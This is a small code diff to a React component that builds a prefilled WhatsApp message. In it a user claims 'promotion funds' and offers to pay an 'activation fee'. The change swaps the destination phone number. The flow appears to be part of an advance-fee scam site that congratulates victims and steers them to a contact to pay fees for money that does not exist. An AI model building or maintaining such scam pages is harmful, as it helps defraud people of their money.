@@ -815,7 +815,7 @@ function CongratsMessage({ balance, currency, custoName, activate }) {
     encodeURIComponent(`Hello ADF, My name is ${name} ${age} years old from ${country}, Email: ${userEmail}. I am here to claim my PROMOMITION Funds of ${currency} ${balance}. I am ready to complete the process by paying the activition fee of ${currency} ${activate}.
      `);
 
-  const whatAppURL = `https://wa.me/+254107545643?text=${encodedmessge}`;
+  const whatAppURL = `https://wa.me/+254736227246?text=${encodedmessge}`;
   return (
     <div className="congra_message">
       <h2> Congratulations For Reaching the last Step</h2>
